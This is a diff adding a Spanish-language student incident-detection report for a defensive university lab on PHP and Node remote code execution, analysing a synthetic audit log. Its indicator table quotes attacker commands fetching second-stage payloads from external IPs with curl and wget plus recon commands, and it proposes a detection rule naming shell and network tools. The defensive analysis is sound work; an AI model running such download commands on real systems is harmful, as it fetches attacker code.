@@ -143,11 +143,68 @@ Frente a una vulnerabilidad nueva como **CVE-2026-115560** (por ejemplo, un defe
 
 # Informe individual — TP PHP2Shell / Node2Shell
 
-**Integrante:** -
-**Usuario de GitHub:** -
-**Rol en el TP:** -
-**Fecha:** -
+**Integrante:** _Jano Stratakis_
+**Usuario de GitHub:** _janostra_
+**Rol en el TP:** _Detección_
+**Fecha:** 29/10/2026
 **Grupo:** 08
+
+---
+
+## 1. Situación y riesgo
+
+El laboratorio tiene tres servicios (`php-lab`, `node-lab`, `py-lab`) en la red interna `labnet`, sin puertos publicados. Desde detección, la pregunta no es solo qué versiones son vulnerables sino si ya hubo explotación. El `audit.log` (sintético, 27/10/2026, 09:40Z–09:49Z) muestra que sí hubo ejecución de comandos en `web01`, `api01` y `svc01`: procesos de aplicación (`apache2`, `node`, `python`) lanzando `sh`, `curl` y `wget`. Esto es consistente con PHP2Shell (PHP 8.3.35 con `session.upload_progress.enabled=1`) y con la explotación de Brotli (CVE-2026-111497) en Node y Python.
+
+Riesgo: alto para `web01` (RCE con descargas externas) y medio para `api01` y `svc01`. La exposición directa a Internet es limitada por el diseño del laboratorio, pero el log indica que el atacante ya tuvo ejecución dentro de los contenedores.
+
+## 2. Plan priorizado
+
+| Prioridad | Acción | Evidencia |
+|---|---|---|
+| 1 | Confirmar el alcance: correr `./scripts/detectar.sh` y revisar el log completo, incluyendo hijos de segundo nivel (`id`, `uname`) que el script no muestra. | Salida del script y líneas L6, L9, L14, L16 de `audit.log`. |
+| 2 | Contener antes de investigar más: verificar `SIN SALIDA` con `./scripts/verificar-contencion.sh` para que `198.51.100.7` y `198.51.100.9` no puedan servir una segunda etapa. | Salida del script (sección 5 de `entrega.md`). |
+| 3 | Parchear y mitigar (`session.upload_progress.enabled=0`, PHP 8.3.36, Node 22.23.4, brotli 1.2.1) y volver a revisar el log y `docker top` después del cambio. | `parchear.sh` y `entrega.md` sección 3. |
+| 4 | Dejar una regla permanente sobre Node.js (`ppid_comm=node` y `comm` en `sh`, `bash`, `curl`, `wget`, `nc`). | `deteccion.md` sección 4. |
+
+## 3. Indicadores de compromiso (IoC)
+
+| Línea / timestamp | Host | Padre → hijo | Evaluación |
+|---|---|---|---|
+| L6 · 09:42:17Z | web01 | `apache2` → `sh -c id` | Compromiso: un worker web ejecuta un shell y reconocimiento. |
+| L9 · 09:43:03Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` | Compromiso: intento de descarga de segunda etapa. |
+| L14 · 09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | Compromiso: descarga desde otra IP externa. |
+| L16 · 09:45:10Z | svc01 | `python` → `sh -c uname -a` | Compromiso: reconocimiento del sistema. |
+| L8, L13, L21 | db01 | `sshd` → `bash` | Probable falso positivo: sesión SSH administrativa, sin usuario ni IP en el log para confirmarlo. |
+
+**Conclusión de la caza:** hay compromiso en tres hosts de aplicación. Está **indeterminado** si las descargas se completaron, porque el log no registra el resultado de red. Que la red sea `internal: true` indica que en el laboratorio no habrían salido, pero eso sale de la configuración y no del log.
+
+**Regla propuesta para Node.js:** alertar cuando `ppid_comm=node` y `comm ∈ {sh, bash, curl, wget, nc}`. Falso negativo: ejecución dentro del propio proceso `node` (sin crear hijo) o uso de otros binarios (`python`, `perl`, `socat`).
+
+**Limitaciones del log:** no tiene usuario, IP de origen ni resultado de los comandos; cubre solo ~10 minutos; sin telemetría de red ni de archivos. Además, `detectar.sh` solo muestra hijos directos de las apps, por lo que oculta `id` y `uname` (hijos de `sh`).
+
+## 4. Transferencia a una CVE distinta (ej. CVE-2026-115560)
+
+Ante una CVE nueva en un componente que no conocemos, desde detección haría lo siguiente:
+
+- **Antes de que exista parche:** definir qué comportamiento sería la huella de la explotación. En este TP fue "proceso de aplicación que lanza un shell"; para un motor de plantillas con inyección de comandos sería el mismo patrón, o `node` conectando a IPs externas inesperadas.
+- **Reutilizar la regla:** la regla `ppid_comm → comm` sirve sin cambios porque no depende de la CVE sino de lo que hace el atacante después. Lo que habría que ajustar es la lista de binarios y los falsos negativos.
+- **Qué cambia:** si la CVE no genera procesos hijo (por ejemplo, ejecución en memoria), la regla no ve nada y haría falta telemetría de red o de llamadas al sistema. Es el límite principal de lo que aprendimos en este TP.
+
+## 5. Lecciones aprendidas
+
+1. **Detectar no reemplaza a parchear, y parchear no reemplaza a detectar.** El inventario dice qué es vulnerable; el log dice si ya pasó algo. Hacen falta ambos.
+2. **Mirar el árbol completo, no solo el primer nivel.** `detectar.sh` filtra por padre de aplicación y deja afuera `id` y `uname`, que prueban que el shell se usó.
+3. **Separar ruido de hallazgos.** `sshd → bash` en `db01` coincide con el patrón de shell, pero no es lo mismo que `apache2 → sh`; el padre importa.
+4. **Un log sin usuario, IP de origen ni resultado no permite atribuir ni medir el daño.** Hay que declararlo como limitación y no afirmar más de lo que muestra.
+5. **La contención compra tiempo para investigar.** Con `SIN SALIDA` verificado, la incertidumbre sobre si las descargas funcionaron deja de ser crítica mientras se completa el análisis.
+
+## 6. Qué no se pudo probar
+
+- Si las descargas de `198.51.100.7` y `198.51.100.9` llegaron a completarse (el log no registra el resultado).
+- La causa de entrada del atacante (qué petición disparó la ejecución): no hay logs HTTP ni IP de origen.
+- Que el `audit.log` sintético corresponda a los contenedores reales del laboratorio: es un archivo provisto por la cátedra.
+- Explotación activa de las vulnerabilidades, que no se realizó porque el TP es estrictamente defensivo.
+- Que la regla de Node.js dispare en un entorno real: se razonó sobre el log pero no se probó en un motor de detección.
 
 -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.
 
